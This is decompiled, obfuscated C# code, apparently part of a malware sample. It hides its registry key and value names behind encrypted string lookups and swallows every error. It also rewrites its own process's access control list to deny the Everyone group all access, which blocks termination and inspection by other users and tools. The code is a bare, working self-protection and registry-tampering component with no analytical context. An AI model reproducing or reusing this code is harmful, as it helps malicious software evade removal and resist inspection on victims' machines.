using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ovnaSovhORzB;

internal sealed class VhIWhLFJdmCNQ
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr suYlTsbNzj, int raWdWIfJNynONH, [Out] byte[] kJiEKuFbuWJh, uint SKHLYZdxMZFG, out uint KfoxyCsWaZDr);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr ShPzcrrOPtFP, int oQbNwmuWcwk, [In] byte[] eZRpvgZCZL);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void LIQomKosqhdxc(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107477085)));
			registryKey.SetValue(EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107476980)), getString_0(107396688));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor CzpIECSDHYywjk(IntPtr intptr_0)
	{
		byte[] kJiEKuFbuWJh = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, kJiEKuFbuWJh, 0u, out var KfoxyCsWaZDr);
		if ((long)KfoxyCsWaZDr > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, kJiEKuFbuWJh = new byte[KfoxyCsWaZDr], KfoxyCsWaZDr, out KfoxyCsWaZDr))
		{
			return null;
		}
		return new RawSecurityDescriptor(kJiEKuFbuWJh, 0);
	}

	private void BBNTUeQrgJiAfJyn(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void CkwuJlusrbtIxa()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = CzpIECSDHYywjk(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			BBNTUeQrgJiAfJyn(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static VhIWhLFJdmCNQ()
	{
		Strings.CreateGetStringDelegate(typeof(VhIWhLFJdmCNQ));
	}
}
